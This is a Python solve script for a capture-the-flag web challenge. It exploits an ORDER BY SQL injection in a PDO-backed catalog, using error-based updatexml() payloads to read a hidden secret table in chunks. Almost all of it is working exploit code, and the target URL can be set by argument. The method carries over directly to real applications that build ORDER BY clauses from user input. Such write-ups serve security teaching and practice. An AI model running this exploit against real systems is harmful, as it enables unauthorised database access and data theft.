#!/usr/bin/env python3
"""
Automated solve for 08 · prepared-sqli.

The catalog binds every VALUE with PDO prepared statements, but builds the
ORDER BY clause by string concatenation of ?sort= (you can't bind an
identifier). Error-based extraction via updatexml() leaks the hidden
internal_notes.secret. updatexml's error text is capped at 32 chars, so we
read the flag in windows with SUBSTRING and stitch them together.

Usage:  python3 solve.py [base_url]      (default http://127.0.0.1:8008)
"""
import re
import sys
import urllib.parse
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8008").rstrip("/")
WINDOW = 25  # chars per request (updatexml shows ~31 of "~"+chunk safely)


def leak(offset):
    payload = (
        "updatexml(1,concat(0x7e,substring("
        "(select secret from internal_notes)," + str(offset) + "," + str(WINDOW)
        + ")),1)"
    )
    url = BASE + "/?" + urllib.parse.urlencode({"sort": payload, "dir": ""})
    html = urllib.request.urlopen(url, timeout=10).read().decode("utf-8", "replace")
    # error text: ... XPATH syntax error: '~<chunk>'   (quote is HTML-escaped)
    m = re.search(r"XPATH syntax error: &#0?39;~(.*?)&#0?39;", html)
    return m.group(1) if m else None


def main():
    flag = ""
    offset = 1
    for _ in range(20):
        chunk = leak(offset)
        if not chunk:
            break
        flag += chunk
        if "}" in flag:
            break
        offset += WINDOW
    m = re.search(r"SecurinetsENIT\{[^}]*\}", flag)
    if m:
        print("[+] FLAG:", m.group(0))
        return 0
    print("[-] extraction failed; got:", repr(flag))
    return 1


if __name__ == "__main__":
    sys.exit(main())
